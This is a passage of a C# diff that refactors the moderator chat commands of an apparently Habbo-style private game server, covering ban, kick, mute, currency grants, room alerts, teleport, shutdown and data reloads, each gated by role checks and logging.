+                            if (!Session.GetHabbo().HasRole("cmd_ipban"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User not found.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
+                            {
+                                Session.SendNotif("You are not allowed to ban that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), true);
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Kick
+                        case 23: //CMD Kick
+                            if (!Session.GetHabbo().HasRole("cmd_kick"))
+                            {
+                                return false;
+                            }
+                            TargetUser = Params[1];
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(TargetUser);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("Could not find user: " + TargetUser);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
+                            {
+                                Session.SendNotif("You are not allowed to kick that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().CurrentRoomId < 1u)
+                            {
+                                Session.SendNotif("That user is not in a room and can not be kicked.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(TargetClient.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetRoom.RemoveUserFromRoom(TargetClient, true, false);
+                            if (Params.Length > 2)
+                            {
+                                TargetClient.SendNotif("A moderator has kicked you from the room for the following reason: " + ChatCommandHandler.MergeParams(Params, 2));
+                            }
+                            else
+                            {
+                                TargetClient.SendNotif("A moderator has kicked you from the room.");
+                            }
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD MassBadge
+                        case 24: //CMD MassBadge
+                            if (Session.GetHabbo().HasRole("cmd_massbadge"))
+                            {
+                                PhoenixEnvironment.GetGame().GetClientManager().GiveMassBadge(Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD MassCredits
+                        case 25: //CMD MassCredits
+                            if (Session.GetHabbo().HasRole("cmd_masscredits"))
+                            {
                                 try
                                 {
-                                    if (!GlobalClass.cmdPushEnabled)
+                                    int MCreditsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GiveCredits(MCreditsToAdd);
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD MassPixels
+                        case 26: //CMD MassPixels
+                            if (Session.GetHabbo().HasRole("cmd_masspixels"))
+                            {
+                                try
+                                {
+                                    int MPixelsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GivePixels(MPixelsToAdd, true);
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD MassPoints
+                        case 27: //CMD MassPoints
+                            if (Session.GetHabbo().HasRole("cmd_masspoints"))
+                            {
+                                try
+                                {
+                                    int MPointsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GivePoints(MPointsToAdd, true);
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Motd
+                        case 30: //CMD Motd
+                            if (!Session.GetHabbo().HasRole("cmd_motd"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("Could not find user: " + Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetClient.SendNotif(ChatCommandHandler.MergeParams(Params, 2), 2);
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Mute
+                        case 31: //CMD Mute
+                            if (!Session.GetHabbo().HasRole("cmd_mute"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null || TargetClient.GetHabbo() == null)
+                            {
+                                Session.SendNotif("Could not find user: " + Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
+                            {
+                                Session.SendNotif("You are not allowed to (un)mute that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetClient.GetHabbo().Mute();
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Override
+                        case 32: //CMD Override
+                            if (!Session.GetHabbo().HasRole("cmd_override"))
+                            {
+                                return false;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser == null)
+                            {
+                                return false;
+                            }
+                            if (TargetRoomUser.AllowOverride)
+                            {
+                                TargetRoomUser.AllowOverride = false;
+                                Session.SendNotif("Walking override disabled.");
+                            }
+                            else
+                            {
+                                TargetRoomUser.AllowOverride = true;
+                                Session.SendNotif("Walking override enabled.");
+                            }
+                            TargetRoom.GenerateMaps();
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Pixels
+                        case 34: //CMD Pixels
+                            if (!Session.GetHabbo().HasRole("cmd_pixels"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User could not be found.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            int PixelsToAdd;
+                            if (int.TryParse(Params[2], out PixelsToAdd))
+                            {
+                                TargetClient.GetHabbo().ActivityPoints = TargetClient.GetHabbo().ActivityPoints + PixelsToAdd;
+                                TargetClient.GetHabbo().UpdateActivityPointsBalance(true);
+                                TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + PixelsToAdd.ToString() + " Pixels!");
+                                Session.SendNotif("Pixels balance updated successfully.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            Session.SendNotif("Please send a valid amount of pixels.");
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Points
+                        case 35: //CMD Points
+                            if (!Session.GetHabbo().HasRole("cmd_points"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User could not be found.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            int PointsToAdd;
+                            if (int.TryParse(Params[2], out PointsToAdd))
+                            {
+                                TargetClient.GetHabbo().shells = TargetClient.GetHabbo().shells + PointsToAdd;
+                                TargetClient.GetHabbo().UpdateShellsBalance(false, true);
+                                TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + PointsToAdd.ToString() + " Points!");
+                                Session.SendNotif("Points balance updated successfully.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            Session.SendNotif("Please send a valid amount of points.");
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD RemoveBadge
+                        case 39: //CMD RemoveBadge
+                            if (Session.GetHabbo().HasRole("cmd_removebadge"))
+                            {
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                if (TargetClient != null)
+                                {
+                                    TargetClient.GetHabbo().GetBadgeComponent().RemoveBadge(PhoenixEnvironment.FilterInjectionChars(Params[2]));
+                                }
+                                else
+                                {
+                                    Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD RoomAlert
+                        case 41: //CMD RoomAlert
+                            if (!Session.GetHabbo().HasRole("cmd_roomalert"))
+                            {
+                                return false;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            string alert = ChatCommandHandler.MergeParams(Params, 1);
+                            for (int i = 0; i < TargetRoom.UserList.Length; i++)
+                            {
+                                TargetRoomUser = TargetRoom.UserList[i];
+                                if (TargetRoomUser != null)
+                                {
+                                    TargetRoomUser.GetClient().SendNotif(alert);
+                                }
+                            }
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD RoomBadge
+                        case 42: //CMD RoomBadge
+                            if (!Session.GetHabbo().HasRole("cmd_roombadge"))
+                            {
+                                return false;
+                            }
+                            if (Session.GetHabbo().CurrentRoom == null)
+                            {
+                                return false;
+                            }
+                            for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
+                            {
+                                try
+                                {
+                                    TargetRoomUser = Session.GetHabbo().CurrentRoom.UserList[i];
+                                    if (TargetRoomUser != null)
                                     {
-                                        Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-                                        return true;
+                                        if (!TargetRoomUser.IsBot)
+                                        {
+                                            if (TargetRoomUser.GetClient() != null)
+                                            {
+                                                if (TargetRoomUser.GetClient().GetHabbo() != null)
+                                                {
+                                                    TargetRoomUser.GetClient().GetHabbo().GetBadgeComponent().GiveBadge(TargetRoomUser.GetClient(), Params[1], true);
+                                                }
+                                            }
+                                        }
                                     }
-                                    if (!Session.GetHabbo().Vip)
+                                }
+                                catch (Exception ex)
+                                {
+                                    Session.SendNotif("Error: " + ex.ToString());
+                                }
+                            }
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD RoomKick
+                        case 43: //CMD RoomKick
+                            if (!Session.GetHabbo().HasRole("cmd_roomkick"))
+                            {
+                                return false;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            bool GenericMsg = true;
+                            string ModMsg = ChatCommandHandler.MergeParams(Params, 1);
+                            if (ModMsg.Length > 0)
+                            {
+                                GenericMsg = false;
+                            }
+                            for (int i = 0; i < TargetRoom.UserList.Length; i++)
+                            {
+                                TargetRoomUser = TargetRoom.UserList[i];
+                                if (TargetRoomUser != null && TargetRoomUser.GetClient().GetHabbo().Rank < Session.GetHabbo().Rank)
+                                {
+                                    if (!GenericMsg)
                                     {
-                                        Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-                                        return true;
+                                        TargetRoomUser.GetClient().SendNotif("You have been kicked by an moderator: " + ModMsg);
                                     }
+                                    TargetRoom.RemoveUserFromRoom(TargetRoomUser.GetClient(), true, GenericMsg);
+                                }
+                            }
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD RoomMute
+                        case 44: //CMD RoomMute
+                            if (Session.GetHabbo().HasRole("cmd_roommute"))
+                            {
+                                if (Session.GetHabbo().CurrentRoom.RoomMuted)
+                                {
+                                    Session.GetHabbo().CurrentRoom.RoomMuted = false;
+                                }
+                                else
+                                {
+                                    Session.GetHabbo().CurrentRoom.RoomMuted = true;
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD SA
+                        case 45: //CMD SA
+                            if (Session.GetHabbo().HasRole("cmd_sa"))
+                            {
+                                ServerMessage Logging = new ServerMessage(134);
+                                Logging.AppendUInt(0);
+                                Logging.AppendString(Session.GetHabbo().Username + ": " + Input.Substring(3));
+                                PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessageToStaff(Logging, Logging);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD SetSpeed
+                        case 47: //CMD SetSpeed
+                            if (Session.GetHabbo().HasRole("cmd_setspeed"))
+                            {
+                                int.Parse(Params[1]);
+                                Session.GetHabbo().CurrentRoom.method_102(int.Parse(Params[1]));
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Shutdown
+                        case 48: //CMD Shutdown
+                            if (Session.GetHabbo().HasRole("cmd_shutdown"))
+                            {
+                                Logging.LogCriticalException("User " + Session.GetHabbo().Username + " shut down the server " + DateTime.Now.ToString());
+                                Task task = new Task(new Action(PhoenixEnvironment.BeginShutDown));
+                                task.Start();
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Spull
+                        case 49: //CMD Spull
+                            if (Session.GetHabbo().HasRole("cmd_spull"))
+                            {
+                                try
+                                {
                                     string a = "down";
-                                    string text = Params[1];
-                                    TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-                                    room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                    TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                    TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
                                     if (Session == null || TargetClient == null)
                                     {
                                         return false;
                                     }
-                                    class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-                                    RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                                    TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                                    RoomUser TargetClient2 = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
                                     if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
                                     {
-                                        Session.GetHabbo().Sendselfwhisper("It can't be that bad mate, no need to push yourself!");
+                                        Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
                                         return true;
                                     }
-                                    bool arg_3DD2_0;
-                                    if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId)
+                                    TargetRoomUser.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
+                                    if (TargetRoomUser.RotBody == 0)
                                     {
-                                        if ((class6.X + 1 != class4.X || class6.Y != class4.Y) && (class6.X - 1 != class4.X || class6.Y != class4.Y) && (class6.Y + 1 != class4.Y || class6.X != class4.X))
-                                        {
-                                            if (class6.Y - 1 == class4.Y)
-                                            {
-                                                if (class6.X == class4.X)
-                                                {
-                                                    goto IL_3DA6;
-                                                }
-                                            }
-                                            arg_3DD2_0 = (class6.X != class4.X || class6.Y != class4.Y);
-                                            goto IL_3DD2;
-                                        }
-                                    IL_3DA6:
-                                        arg_3DD2_0 = false;
+                                        a = "up";
                                     }
-                                    else
+                                    if (TargetRoomUser.RotBody == 2)
                                     {
-                                        arg_3DD2_0 = true;
+                                        a = "right";
                                     }
-                                IL_3DD2:
-                                    if (!arg_3DD2_0)
+                                    if (TargetRoomUser.RotBody == 4)
                                     {
-                                        class6.Chat(Session, "*pushes " + TargetClient.GetHabbo().Username + "*", false);
-                                        if (class6.RotBody == 0)
-                                        {
-                                            a = "up";
-                                        }
-                                        if (class6.RotBody == 2)
-                                        {
-                                            a = "right";
-                                        }
-                                        if (class6.RotBody == 4)
-                                        {
-                                            a = "down";
-                                        }
-                                        if (class6.RotBody == 6)
-                                        {
-                                            a = "left";
-                                        }
-                                        if (a == "up")
-                                        {
-                                            class4.MoveTo(class4.X, class4.Y - 1);
-                                        }
-                                        if (a == "right")
-                                        {
-                                            class4.MoveTo(class4.X + 1, class4.Y);
-                                        }
-                                        if (a == "down")
-                                        {
-                                            class4.MoveTo(class4.X, class4.Y + 1);
-                                        }
-                                        if (a == "left")
-                                        {
-                                            class4.MoveTo(class4.X - 1, class4.Y);
-                                        }
+                                        a = "down";
+                                    }
+                                    if (TargetRoomUser.RotBody == 6)
+                                    {
+                                        a = "left";
+                                    }
+                                    if (a == "up")
+                                    {
+                                        TargetClient2.MoveTo(TargetRoomUser.X, TargetRoomUser.Y - 1);
+                                    }
+                                    if (a == "right")
+                                    {
+                                        TargetClient2.MoveTo(TargetRoomUser.X + 1, TargetRoomUser.Y);
+                                    }
+                                    if (a == "down")
+                                    {
+                                        TargetClient2.MoveTo(TargetRoomUser.X, TargetRoomUser.Y + 1);
+                                    }
+                                    if (a == "left")
+                                    {
+                                        TargetClient2.MoveTo(TargetRoomUser.X - 1, TargetRoomUser.Y);
                                     }
                                     return true;
                                 }
@@ -1574,348 +941,997 @@ namespace Phoenix.HabboHotel.Misc
                                 {
                                     return false;
                                 }
-							case 38:
-                                room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-							    class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-							    if (class6.IsTrading)
-							    {
-								    Session.GetHabbo().Sendselfwhisper("Command unavailable while trading");
-								    return true;
-							    }
-							    if (GlobalClass.cmdRedeemCredits)
-							    {
-								    Session.GetHabbo().GetInventoryComponent().method_1(Session);
-							    }
-							    else
-							    {
-								    Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-							    }
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Summon
+                        case 50: //CMD Summon
+                            if (Session.GetHabbo().HasRole("cmd_summon"))
+                            {
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                if (TargetClient != null && TargetClient.GetHabbo().CurrentRoom != Session.GetHabbo().CurrentRoom)
+                                {
+                                    ServerMessage Message5 = new ServerMessage(286u);
+                                    Message5.AppendBoolean(Session.GetHabbo().CurrentRoom.IsPublic);
+                                    Message5.AppendUInt(Session.GetHabbo().CurrentRoomId);
+                                    TargetClient.SendMessage(Message5);
+                                    TargetClient.SendNotif(Session.GetHabbo().Username + " has summoned you to them");
+                                }
+                                else
+                                {
+                                    Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online anymore :(");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
                                 return true;
-							case 40:
+                            }
+                            return false;
+                        #endregion
+                        #region CMD SuperBan
+                        case 51: //CMD SuperBan
+                            if (!Session.GetHabbo().HasRole("cmd_superban"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User not found.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
+                            {
+                                Session.SendNotif("You are not allowed to ban that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), false);
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Teleport
+                        case 52: //CMD Teleport
+                            if (!Session.GetHabbo().HasRole("cmd_teleport"))
+                            {
+                                return false;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser == null)
+                            {
+                                return false;
+                            }
+                            if (TargetRoomUser.TeleportMode)
+                            {
+                                TargetRoomUser.TeleportMode = false;
+                                Session.SendNotif("Teleporting disabled.");
+                            }
+                            else
+                            {
+                                TargetRoomUser.TeleportMode = true;
+                                Session.SendNotif("Teleporting enabled.");
+                            }
+                            TargetRoom.GenerateMaps();
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD UnMute
+                        case 54: //CMD UnMute
+                            if (!Session.GetHabbo().HasRole("cmd_unmute"))
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null || TargetClient.GetHabbo() == null)
+                            {
+                                Session.SendNotif("Could not find user: " + Params[1]);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetClient.GetHabbo().Unmute();
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Update Achievements
+                        case 55: //CMD Update Achievements
+                            if (Session.GetHabbo().HasRole("cmd_update_achievements"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    AchievementManager.LoadAchievements(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Bans
+                        case 56: //CMD Update Bans
+                            if (Session.GetHabbo().HasRole("cmd_update_bans"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetBanManager().LoadBans(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().CheckForAllBanConflicts();
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region  CMD Update Bots
+                        case 57: //CMD Update Bots
+                            if (Session.GetHabbo().HasRole("cmd_update_bots"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetBotManager().LoadBots(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Catalogue
+                        case 58: //CMD Update Catalogue
+                            if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetCatalog().Initialize(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetCatalog().InitCache();
+                                PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(new ServerMessage(441u));
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Filter
+                        case 59: //CMD Update Filter
+                            if (Session.GetHabbo().HasRole("cmd_update_filter"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    ChatCommandHandler.UpdateFilters(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Items
+                        case 60: //CMD Update Items
+                            if (Session.GetHabbo().HasRole("cmd_update_items"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetItemManager().LoadItems(adapter);
+                                }
+                                Session.SendNotif("Item defenitions reloaded successfully.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Navigator
+                        case 61: //CMD Update Navigator
+                            if (Session.GetHabbo().HasRole("cmd_update_navigator"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetNavigator().LoadNavigator(adapter);
+                                    PhoenixEnvironment.GetGame().GetRoomManager().LoadModels(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Permissions
+                        case 62: //CMD Update Premissions
+                            if (Session.GetHabbo().HasRole("cmd_update_permissions"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().GetRoleManager().LoadRoles(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Settings
+                        case 63: ///CMD Update Settings
+                            if (Session.GetHabbo().HasRole("cmd_update_settings"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    PhoenixEnvironment.GetGame().LoadSettings(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Update Texts
+                        case 65: //CMD Update Texts
+                            if (Session.GetHabbo().HasRole("cmd_update_texts"))
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    TextManager.LoadTexts(adapter);
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD UserInfo
+                        case 64: //CMD UserInfo
+                            if (!Session.GetHabbo().HasRole("cmd_userinfo"))
+                            {
+                                return false;
+                            }
+                            bool flag2 = true;
+                            if (string.IsNullOrEmpty(Params[1]))
+                            {
+                                Session.SendNotif("Please enter a username");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                flag2 = false;
+                                TargetHabbo = Authenticator.GetHabboViaUsername(Params[1]);
+                            }
+                            else
+                            {
+                                TargetHabbo = TargetClient.GetHabbo();
